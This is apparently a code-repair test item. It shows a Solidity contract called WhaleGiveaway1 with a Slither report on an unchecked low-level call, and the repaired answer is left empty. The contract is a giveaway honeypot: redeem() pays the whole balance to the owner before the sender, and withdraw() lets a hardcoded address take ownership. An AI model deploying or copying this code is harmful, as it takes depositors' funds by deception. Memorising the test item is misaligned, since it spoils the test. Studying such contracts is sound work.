/// Your task is to repair the following Solidity Smart Contract
pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
    }
}

/// This Solidity Smart Contract has been analyzed by smart contract analyzers. Here are the results from these analyzers.

/// 1. Slither Analysis Results
/// 1.1. Vulnerability: unchecked_low_level_call at Line 24-28:
    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
///  Message:Low level call in WhaleGiveaway1.Command (0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol#24-28):
///   	-adr.call.value(msg.value)(data) 0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol#27



/// Repaired Solidity Smart Contract